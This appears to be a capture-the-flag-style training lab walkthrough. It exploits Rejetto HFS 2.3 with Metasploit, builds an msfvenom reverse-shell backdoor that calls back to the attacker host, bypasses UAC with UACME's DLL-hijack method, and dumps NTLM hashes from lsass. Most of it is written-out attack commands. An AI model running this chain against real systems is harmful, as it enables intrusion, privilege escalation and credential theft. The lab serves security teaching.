In this lab, we will look at bypassing [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) using the [UACME](https://github.com/hfiref0x/UACME) tool.

**UACME:**

- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
- Developed by https://twitter.com/hFireF0X
- Written majorly in C, with some code in C++

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable server will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the UACME tool.

**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.

**Note:** The UACMe tool is located in **"/root/Desktop/tools/UACME/"** directory.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- UACME

_______
**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/b01db6c99e0bf8e78c1a07b0fdc7945a356e3c3871814285eec2382e57ad21be.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/1b96aa97578604ccd8c3052b852ae5a9cf2590b3b77240b363dbe4907db04e45.jpg)

The target is reachable.

**Step 3:** Check open ports on the target machine:

**Command:**

```
nmap demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/ead40d110d7af12ce69768d0a2350e660fde110f3b5d07abf212a91ced9e2496.jpg)

**Step 4:** We have discovered that multiple ports are open. We will run Nmap again to determine version information on port 80.

**Command:**

```
nmap -sV -p 80 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/52bf45839ab79f68a436914c3945ffe1ba25b2a42124cd481b23b19370dbe6b8.jpg)

HTTP File Server (HFS) 2.3 is available.

**Step 5:** We will search for an exploit for hfs file server using searchsploit.

**Command:**

```
searchsploit hfs
```

![Content Image](https://assets.ine.com/lab/learningpath/01747754f654418b96c7aefecd397763b596426376108ec09ca3c9984d1c25ba.jpg)

**Step 6:** : Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.

**Commands:**

```
msfconsole -q

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/9567447c54a5bb921f412984db18efa2fa13d18c0a72595720b72e89454b3f80.jpg)

We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell.

**Step 7:** Checking the current user.

**Commands:**

```
getuid
sysinfo
```

![Content Image](https://assets.ine.com/lab/learningpath/e1192fea944340e6cc965ec85c93b85676830b3298d738e44a2e0ff2a1dcec47.jpg)

**Step 8:** We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.

**Commands:**

```
ps -S explorer.exe
migrate 2332
```

![Content Image](https://assets.ine.com/lab/learningpath/b63913f7a21fee29f6755d4e7977fbbe05cf09056910c137dff5f422dfe214c7.jpg)

**Step 9:** Elevate to the high privilege:

**Command**:

```
getsystem
```

![Content Image](https://assets.ine.com/lab/learningpath/dfee5357ac2f99ce5e05d717c484ffa71f2a8008b15b95d93af06ec74d9dbcd4.jpg)

We can observe that we do not have permission to elevate privileges.

**Step 10:** Get a windows shell and check if the admin user is a member of the Administrators group.

**Commands:**

```
shell
net localgroup administrators
```

![Content Image](https://assets.ine.com/lab/learningpath/c6de203bce53e64cd3e6353e63eb677f731323e9b00c0c738cb09bff6e8f6adb.jpg)

The admin user is a member of the Administrators group. However, we do not have the high privilege as of now. We can gain high privilege by Bypassing UAC (User Account Control)

We are going to bypass the UAC for admin user with the help of UACMe tool.

**Step 11:** Generating malicious executable using msfvenom and running it on the target machine to gain administrator user privileges.

**Note:** Please make sure that you replace the “10.10.31.2” local IP address with yours.

Generating malicious executable using msfvenom.

**Commands:**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'

file backdoor.exe
```

![Content Image](https://assets.ine.com/lab/learningpath/2ef95d3f0c877715e4d0be50352d2c63d32e63fa119af12a6195c7cb89884970.jpg)

The UACMe tool located in **"/root/Desktop/tools/UACME/"** directory.

**Step 12:** Switch the directory to the user’s temp folder and upload the Akagi64.exe and backdoor.exe executable.

**Commands:**

```
CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```

![Content Image](https://assets.ine.com/lab/learningpath/4d32710f7c5e72b706b5a2c227185ed05ed658c06f029790a32987287ae9e0fa.jpg)

**Step 13:** Start another msfconsole and run a multi handler.

**Commands:**

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/e5024f95099c20c8cd5be126421ef054864eb387304c805f4c2cd3523bd5afe5.jpg)

**Step 14:** Switch back to the meterpreter and run the Akagi64.exe executable.

**Note:** Please provide the full path of the backdoor executable.

**Commands:**

```
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

We are going to use UACMe method number 23:

- **Author:** Leo Davidson derivative
- **Type:** Dll Hijack
- **Method:** IFileOperation
- **Target(s):** \system32\pkgmgr.exe
- **Component(s):** DismCore.dll
- **Implementation:** ucmDismMethod

![Content Image](https://assets.ine.com/lab/learningpath/6c1846af2be3e5c062a73665a7a708a82963152150ddf59e8bedbcf38194cc6b.jpg)

Once we execute the above command we would expect a meterpreter session.

![Content Image](https://assets.ine.com/lab/learningpath/c311478f14eb9484ef04849f6402521a5648c2d0c677dc542d8fc128be497f48.jpg)

We have successfully gained high privilege access. Dump the user hashes.

**Step 15:** Migrate in lsass.exe process.

**Commands:**

```
ps -S lsass.exe
migrate 496
```

![Content Image](https://assets.ine.com/lab/learningpath/f856c15d1adc89300ca38a17b4d81e1978a8fad8fc1669c719c37b2799775af5.jpg)

**Step 16:** Dump the hashes.

**Command:**

```
hashdump
```

![Content Image](https://assets.ine.com/lab/learningpath/3d6d50cf03819f9a5a2ab09d17b8bfbba150c21f27ae9d3dd0dffc9e2667c7c3.jpg)

This reveals the flag to us.

**Admin NTLM Hash:** 4d6583ed4cef81c2f2ac3c88fc5f3da6

# Conclusion

In this lab, we exploited a vulnerable application to gain shell access on the target machine and then bypassed UAC using the UACME tool to gain elevated access and dump user hashes.

# References

- [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution](https://www.exploit-db.com/exploits/39161)
- [Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)
- [UACMe](https://github.com/hfiref0x/UACME)